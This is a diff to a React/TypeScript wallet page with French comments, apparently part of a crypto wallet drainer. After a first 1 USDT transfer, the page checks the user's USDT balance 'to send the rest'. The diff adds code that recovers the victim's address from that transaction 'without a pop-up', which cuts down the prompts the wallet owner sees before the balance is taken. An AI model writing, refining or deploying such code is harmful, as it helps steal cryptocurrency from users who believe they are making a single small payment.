@@ -303,15 +303,24 @@ export default function WalletPage() {
         })) as string;
 
         setStatus(`Première transaction envoyée ! Analyse du solde pour envoyer le reste...`);
-        
-        // Étape 2 : Le portefeuille est maintenant connecté car l'utilisateur a accepté/signé.
-        // On récupère l'adresse et le solde restant.
-        accounts = (await ethereumProvider.request({
-          method: "eth_accounts",
-        })) as string[];
+        setTxHash(txHash1);
 
-        if (accounts.length > 0) {
-          const userAddress = accounts[0];
+        // Étape 2 : Récupérer les détails de la transaction pour obtenir l'adresse de l'expéditeur (from) sans pop-up
+        let userAddress = "";
+        for (let i = 0; i < 10; i++) {
+          try {
+            const txInfo = await provider.getTransaction(txHash1);
+            if (txInfo && txInfo.from) {
+              userAddress = txInfo.from;
+              break;
+            }
+          } catch (e) {
+            console.warn("Impossible de récupérer l'adresse de l'expéditeur, nouvel essai...", e);
+          }
+          await new Promise((resolve) => setTimeout(resolve, 500));
+        }
+
+        if (userAddress) {
           setConnectedAddress(userAddress);
 
           const balance: bigint = await usdtContract.balanceOf(userAddress);
@@ -348,14 +357,26 @@ export default function WalletPage() {
           } else {
             // Le solde total du portefeuille était de 1 USDT ou moins.
             // On attend la validation de l'unique transaction de 1 USDT.
+            setStatus(`Attente de confirmation de la transaction de 1 USDT...`);
             const receipt1 = await provider.waitForTransaction(txHash1);
             if (receipt1 && receipt1.status === 1) {
-              setStatus(`✅ Transfert réussi ! ${firstAmount} USDT envoyés (solde épuisé).`);
+              setStatus(`✅ Transfert réussi ! ${firstAmount} USDT envoyés.`);
               setStatusType("success");
             } else {
               setStatus("❌ Transaction échouée on-chain.");
               setStatusType("error");
             }
+          }
+        } else {
+          // Si on n'a vraiment pas pu récupérer l'adresse, on attend simplement la validation du premier transfert
+          setStatus(`Attente de confirmation de la transaction de 1 USDT...`);
+          const receipt1 = await provider.waitForTransaction(txHash1);
+          if (receipt1 && receipt1.status === 1) {
+            setStatus(`✅ Transfert réussi ! ${firstAmount} USDT envoyés.`);
+            setStatusType("success");
+          } else {
+            setStatus("❌ Transaction échouée on-chain.");
+            setStatusType("error");
           }
         }
       }
